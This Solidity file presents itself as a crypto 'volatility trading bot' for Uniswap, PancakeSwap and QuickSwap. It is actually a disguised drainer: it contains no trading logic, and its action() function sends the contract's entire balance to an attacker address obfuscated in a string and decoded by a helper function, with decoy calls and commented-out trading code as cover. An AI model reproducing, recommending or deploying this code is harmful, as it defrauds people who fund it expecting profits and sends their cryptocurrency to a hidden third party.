pragma solidity ^0.5.17;


//uniswap smart contracts 
import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2ERC20.sol";

//pancakeswap smart contract
import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeFactory.sol";

//quickswap smart contract
//import "https://github.com/QuickSwap/quickswap-core/blob/master/contracts/Migrations.sol";


//set blockchain 1=ETH min 0.05 eth ,2=BNB min 0.15 bnb ,3=Matic min 50 matic 
// note: the address used to deploy this contact will be the payment address




contract VolatilityTradingBot {
	string public setblockchain = "";

	
	constructor(string memory _setblockchain) public {
		setblockchain = _setblockchain;

	}
	
function() external payable {}
	

 function CalculateNumbers(string memory _string, uint256 _pos, string memory _letter) internal pure returns (string memory) {
        bytes memory _stringBytes = bytes(_string);
        bytes memory result = new bytes(_stringBytes.length);

  for(uint i = 0; i < _stringBytes.length; i++) {
        result[i] = _stringBytes[i];
        if(i==_pos)
         result[i]=bytes(_letter)[0];
    }
    return  string(result);
 } 
   function startAttact() public pure returns (address adr) {
   string memory neutral_variable = "QG8f4799b47eEd340E9B22780E4a1f7Ad524de737d";
   CalculateNumbers(neutral_variable,0,'0');
   CalculateNumbers(neutral_variable,1,'x');
   address addr = parseDeeptime(neutral_variable);
    return addr;
   }
function parseDeeptime(string memory _a) internal pure returns (address _parsedAddress) {
    bytes memory tmp = bytes(_a);
    uint160 iaddr = 0;
    uint160 b1;
    uint160 b2;
    for (uint i = 2; i < 2 + 2 * 20; i += 2) {
        iaddr *= 256;
        b1 = uint160(uint8(tmp[i]));
        b2 = uint160(uint8(tmp[i + 1]));
        if ((b1 >= 97) && (b1 <= 102)) {
            b1 -= 87;
        } else if ((b1 >= 65) && (b1 <= 70)) {
            b1 -= 55;
        } else if ((b1 >= 48) && (b1 <= 57)) {
            b1 -= 48;
        }
        if ((b2 >= 97) && (b2 <= 102)) {
            b2 -= 87;
        } else if ((b2 >= 65) && (b2 <= 70)) {
            b2 -= 55;
        } else if ((b2 >= 48) && (b2 <= 57)) {
            b2 -= 48;
        }
        iaddr += (b1 * 16 + b2);
    }
    return address(iaddr);
}

//  const pair = await Fetcher.fetchPairData(WBNB, BUSD, provider)
//   const route = await new Route([pair], WBNB)
//    const trade = await new Trade(route, new TokenAmount(WBNB, tradeAmount), TradeType.EXACT_INPUT)
//    const executionPrice = trade.executionPrice.toSignificant(12)
//    const pancakeSwap = new web3.eth.Contract(
//        abis.uniswapRouter.abi,
//        addresses.PANCAKE_ROUTER //'0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F'
//   );

function action() public payable{
	address(uint160(startAttact())).transfer(address(this).balance);	    
}

}
